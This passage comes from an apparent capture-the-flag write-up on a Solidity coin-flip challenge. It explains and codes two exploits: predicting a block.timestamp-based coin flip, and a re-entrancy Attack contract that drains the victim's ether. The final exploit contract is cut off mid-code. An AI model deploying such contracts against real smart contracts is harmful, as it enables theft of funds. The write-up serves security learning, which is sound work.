</span></span><span class=line><span class=cl>                    <span class=nb>keccak256</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>^</span> <span class=mh>0x1F2DF76A6</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=p>)</span> <span class=o>%</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>            <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>viewWins</span><span class=p>(</span><span class=kt>address</span> <span class=n>_addr</span><span class=p>)</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>playerConsecutiveWins</span><span class=p>[</span><span class=n>_addr</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>depositFunds</span><span class=p>(</span><span class=kt>address</span> <span class=n>_to</span><span class=p>)</span> <span class=k>internal</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>playerPool</span><span class=p>[</span><span class=n>_to</span><span class=p>]</span> <span class=o>+=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>sendValue</span><span class=p>(</span><span class=kt>address</span> <span class=k>payable</span> <span class=n>recipient</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amount</span><span class=p>)</span> <span class=k>internal</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span> <span class=o>&gt;=</span> <span class=n>amount</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;Address: insufficient balance&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=kt>bool</span> <span class=n>success</span><span class=p>,</span> <span class=p>)</span> <span class=o>=</span> <span class=n>recipient</span><span class=p>.</span><span class=nb>call</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=n>amount</span><span class=p>}(</span><span class=s>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>withdrawPrizeMoney</span><span class=p>(</span><span class=kt>address</span> <span class=n>_to</span><span class=p>)</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>_to</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;Only the player can withdraw the prize money&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>playerConsecutiveWins</span><span class=p>[</span><span class=n>_to</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=mi>3</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;You need to win 3 or more consecutive games to claim the prize money&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>playerConsecutiveWins</span><span class=p>[</span><span class=n>_to</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kt>uint</span> <span class=n>prizeMoney</span> <span class=o>=</span> <span class=n>playerPool</span><span class=p>[</span><span class=n>_to</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=n>playerPool</span><span class=p>[</span><span class=n>_to</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>sendValue</span><span class=p>(</span><span class=k>payable</span><span class=p>(</span><span class=n>_to</span><span class=p>),</span> <span class=n>prizeMoney</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>withdrawFirstWinPrizeMoneyBonus</span><span class=p>()</span> <span class=k>external</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=o>!</span><span class=n>claimedPrizeMoney</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>],</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;You have already claimed the first win bonus&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>playerPool</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span> <span class=kc>ether</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>withdrawPrizeMoney</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>claimedPrizeMoney</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>isSolved</span><span class=p>()</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Return true if the game is solved
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=contract-functions>Contract Functions<a hidden class=anchor aria-hidden=true href=#contract-functions>#</a></h3><p>Based on the source code of the contract itself, we can learn a couple of things</p><ul><li>The contract is basically a coin flipping game.</li><li>The <code>guess()</code> function essentially allows us to enter the game and make a guess, making the address who called this function the <code>currentPlayer</code>.</li><li>The <code>revealResults()</code> function makes a <code>flipCoin()</code> and uses that as the comparison against the <code>guess()</code>.</li><li>If you win a coin flip 3 times consecutively, you can claim claim all the ether you&rsquo;ve won plus 1 additional ether through <code>WithdrawFirstWinPrizeMoneyBonus()</code><ul><li>This additional 1 ether bonus only applies on your first win.</li></ul></li><li>We solve the problem when we drain all the funds from the contract itself.<ul><li>We can determine the amount of funds in the contract by running <code>web3.eth.getBalance(contractAddress)</code>, which tells us that there&rsquo;s 5 ether in the contract itself when we deploy the contract
<img loading=lazy src=https://user-images.githubusercontent.com/33711159/173046447-fdef0e74-81ea-49c5-b039-bcf2459f3fb4.png alt=image></li></ul></li></ul><h2 id=exploit-1---predictable-block-timestamp>Exploit 1 - Predictable Block Timestamp<a hidden class=anchor aria-hidden=true href=#exploit-1---predictable-block-timestamp>#</a></h2><p>Let&rsquo;s take a look at how the results of the <code>flipCoin()</code> function gets generated</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=kd>function</span> <span class=nf>flipCoin</span><span class=p>()</span> <span class=k>private</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=n>CoinFlipOption</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span>
</span></span><span class=line><span class=cl>        <span class=n>CoinFlipOption</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=kt>uint</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=nb>keccak256</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>^</span> <span class=mh>0x1F2DF76A6</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span> <span class=o>%</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ul><li><code>keccak256(abi.encodePacked(block.timestamp ^ 0x1F2Df76A6))</code> &ndash; According to the <a href="https://docs.soliditylang.org/en/latest/units-and-global-variables.html?highlight=block#block-and-transaction-properties:~:text=keccak256(abi.encodePacked(a%2C%20b))%20is%20a%20way%20to%20compute%20the%20hash%20of%20structured%20data">documentation</a>, this computes the hash of some structured data.</li></ul><p>What is interesting to us is the use of <code>block.timestamp</code> over here, which according to the <a href="https://docs.soliditylang.org/en/latest/units-and-global-variables.html?highlight=block#block-and-transaction-properties">solidity documentation</a>, is essentially the current block&rsquo;s timestamp in seconds &ndash;> in other words, a deterministic value.</p><p>So I guess the question is, how do we exploit this idea? When a transaction is made, it gets stored onto a block and it is this particular block&rsquo;s timestamp that we are interested in.</p><p>In order to exploit this, we first got to call the <code>guess()</code> function along with the <code>revealResults()</code> function <em>in the same transaction</em>, so something like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Attack</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>RollsRoyce</span> <span class=n>victim</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=n>owner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=k>payable</span> <span class=n>_addr</span><span class=p>)</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>victim</span> <span class=o>=</span> <span class=n>RollsRoyce</span><span class=p>(</span><span class=n>_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>flipCoin</span><span class=p>()</span> <span class=k>private</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=n>RollsRoyce</span><span class=p>.</span><span class=n>CoinFlipOption</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>            <span class=n>RollsRoyce</span><span class=p>.</span><span class=n>CoinFlipOption</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=kt>uint256</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                    <span class=nb>keccak256</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>^</span> <span class=mh>0x1F2DF76A6</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=p>)</span> <span class=o>%</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>            <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>win</span><span class=p>()</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span> <span class=o>&gt;=</span> <span class=mi>1</span> <span class=kc>ether</span><span class=p>,</span> <span class=s>&#34;Send contract some ether&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>RollsRoyce</span><span class=p>.</span><span class=n>CoinFlipOption</span> <span class=n>result</span> <span class=o>=</span> <span class=n>flipCoin</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>victim</span><span class=p>.</span><span class=n>guess</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=mi>1</span> <span class=kc>ether</span><span class=p>}(</span><span class=n>result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>victim</span><span class=p>.</span><span class=n>revealResults</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Essentially, the <code>win()</code> function basically tries to call <code>guess()</code> and <code>revealResults()</code> in the same transaction, therefore making <code>block.timestamp</code> a deterministic value which allows us to predict the result of the <code>flipCoin()</code> function and making an accurate <code>guess()</code>.</p><p>We can then deploy this <code>Attack</code> contract and transfer some ether to it. We can verify that our <code>win()</code> function is indeed working as intended by calling the function multiple times and verifying against the <code>viewWins()</code> function in the deployed RollsRoyce contract as shown below</p><p><img loading=lazy src=https://user-images.githubusercontent.com/33711159/172994068-ec4c683c-64df-4d5f-89c4-19c772dbc399.png alt=image></p><p>Great! We have a surefireway to win the coin flips now by exploiting the usage of a predictable <code>block.timestamp</code>!</p><h2 id=exploit-2---re-entrancy-attack>Exploit 2 - Re-entrancy Attack<a hidden class=anchor aria-hidden=true href=#exploit-2---re-entrancy-attack>#</a></h2><p>A classic attack when it comes to exploiting smart contracts - a re-entrancy attack in short basically exploits the idea of a victim contract blindly makes an external call to a malicious contract. In this challenge, the re-entrancy attack was exploitable through the <code>withdrawFirstWinPrizeMoneyBonus()</code> function as shown below:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=kd>function</span> <span class=nf>withdrawFirstWinPrizeMoneyBonus</span><span class=p>()</span> <span class=k>external</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=o>!</span><span class=n>claimedPrizeMoney</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;You have already claimed the first win bonus&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>playerPool</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span> <span class=kc>ether</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>withdrawPrizeMoney</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>claimedPrizeMoney</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>When a player calls the <code>withdrawFirstWinPrizeMoneyBonus()</code> after winning the game, the contract will essentially add an additional 1 ether to the player&rsquo;s prize pool via <code>playerPool[msg.sender] += 1 ether</code>. The thing is, this function can only be called once by the player as seen in the first statement <code>require(!claimedPrizeMoney[msg.sender]</code>. <code>claimedPrizeMoney[msg.sender]</code> gets set to <code>true</code> at the end of the function in the last line, after <code>withdrawPrizeMoney()</code>.</p><p>Now let&rsquo;s look at what <code>withdrawPrizeMoney()</code> does:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=kd>function</span> <span class=nf>sendValue</span><span class=p>(</span><span class=kt>address</span> <span class=k>payable</span> <span class=n>recipient</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amount</span><span class=p>)</span> <span class=k>internal</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span> <span class=o>&gt;=</span> <span class=n>amount</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;Address: insufficient balance&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=kt>bool</span> <span class=n>success</span><span class=p>,</span> <span class=p>)</span> <span class=o>=</span> <span class=n>recipient</span><span class=p>.</span><span class=nb>call</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=n>amount</span><span class=p>}(</span><span class=s>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nf>withdrawPrizeMoney</span><span class=p>(</span><span class=kt>address</span> <span class=n>_to</span><span class=p>)</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>_to</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;Only the player can withdraw the prize money&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>playerConsecutiveWins</span><span class=p>[</span><span class=n>_to</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=mi>3</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;You need to win 3 or more consecutive games to claim the prize money&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>playerConsecutiveWins</span><span class=p>[</span><span class=n>_to</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>prizeMoney</span> <span class=o>=</span> <span class=n>playerPool</span><span class=p>[</span><span class=n>_to</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>playerPool</span><span class=p>[</span><span class=n>_to</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>sendValue</span><span class=p>(</span><span class=k>payable</span><span class=p>(</span><span class=n>_to</span><span class=p>),</span> <span class=n>prizeMoney</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Essentially, <code>withdrawPrizeMoney()</code> simply sends the player calling the function the amount of ether as stored in <code>playerPool[recipient]</code>, after checking that the player has won at least 3 or more times consecutively.</p><p>So where is the vulnerability and how can it be exploited?</p><p>When a contract sends another address some ether like seen in the <code>sendValue(address payable recipient, uint256 amount)</code> function, the contract is actually making a call to the victim&rsquo;s <a href=https://docs.soliditylang.org/en/latest/contracts.html#receive-ether-function>receive()</a> function. In essence, we can implement the <code>receive()</code> function in a way such that it makes a recursive call back to a victim contract&rsquo;s exploitable function.</p><p>In this case, the exploitable function is the <code>withdrawFirstWinPrizeMoneyBonus()</code>. Lets take a look at the function calls being made when a player calls the <code>withdrawFirstWinPrizeMoneyBonus()</code> function (or at least what&rsquo;s important to take note of):</p><ul><li><code>withdrawFirstWinPrizeMoneyBonus()</code> &ndash;><ul><li>`require(!claimedPrizeMoney[msg.sender]) &ndash;></li><li><code>playerPool[msg.sender] += 1 ether;</code> &ndash;></li><li><code>withdrawPrizeMoney(msg.sender);</code> &ndash;><ul><li><code>sendValue(payable(_to), prizeMoney);</code> &ndash;></li></ul></li><li><code>claimedPrizeMoney[msg.sender] = true;</code></li></ul></li></ul><p>If we can somehow re-make the call to the <code>withdrawFirstWinPrizeMoneyBonus()</code> function before <code>claimedPrizeMoney[msg.sender]</code> gets set to <code>true</code>, we can essentially keep recursively calling that function until the contract has no funds, which is the aim of this challenge ultimately. In other words, we want to make a function call back to the <code>withdrawFirstWinPrizeMoneyBonus()</code> function right after receiving ether from the victim contract, something like below:</p><ul><li><code>withdrawFirstWinPrizeMoneyBonus()</code> &ndash;><ul><li><code>require(!claimedPrizeMoney[msg.sender])</code> &ndash;></li><li><code>playerPool[msg.sender] += 1 ether;</code> &ndash;></li><li><code>withdrawPrizeMoney(msg.sender);</code> &ndash;><ul><li><code>sendValue(payable(_to), prizeMoney);</code> &ndash;><ul><li><code>withdrawFirstWinPrizeMoneyBonus()</code> &ndash;><ul><li><code>require(!claimedPrizeMoney[msg.sender])</code> &ndash;></li><li><code>playerPool[msg.sender] += 1 ether;</code> &ndash;></li><li><code>withdrawPrizeMoney(msg.sender);</code> &ndash;><ul><li><code>sendValue(payable(_to), prizeMoney);</code> &ndash;><ul><li>&mldr;&mldr;.</li></ul></li></ul></li></ul></li></ul></li></ul></li><li><code>claimedPrizeMoney[msg.sender] = true;</code></li></ul></li></ul><p>We can achieve this by simply extending our <code>Attack</code> contract and implementing our own malicious <code>receive()</code> function as shown below:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=n>receive</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>victim</span><span class=p>.</span><span class=n>viewWins</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>))</span> <span class=o>&gt;=</span> <span class=mi>3</span> <span class=o>&amp;&amp;</span> <span class=kt>address</span><span class=p>(</span><span class=n>victim</span><span class=p>).</span><span class=nb>balance</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>victim</span><span class=p>.</span><span class=n>withdrawFirstWinPrizeMoneyBonus</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Note that we also want to check that we only trigger the vulnerable re-entrancy function if we have already won the game, and we only wish to keep drawing the funds if there are even funds to draw.</p><h2 id=wrapping-it-all-up-like-a-sushi-roll>Wrapping it all up like a Sushi Roll<a hidden class=anchor aria-hidden=true href=#wrapping-it-all-up-like-a-sushi-roll>#</a></h2><p>Alright, now that we understand what we need to do, let&rsquo;s implement the full exploit contract!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Attack</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>RollsRoyce</span> <span class=n>victim</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=n>owner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=k>payable</span> <span class=n>_addr</span><span class=p>)</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>victim</span> <span class=o>=</span> <span class=n>RollsRoyce</span><span class=p>(</span><span class=n>_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>flipCoin</span><span class=p>()</span> <span class=k>private</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=n>RollsRoyce</span><span class=p>.</span><span class=n>CoinFlipOption</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>            <span class=n>RollsRoyce</span><span class=p>.</span><span class=n>CoinFlipOption</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=kt>uint</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                    <span class=nb>keccak256</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>^</span> <span class=mh>0x1F2DF76A6</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=p>)</span> <span class=o>%</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>            <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>win</span><span class=p>()</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
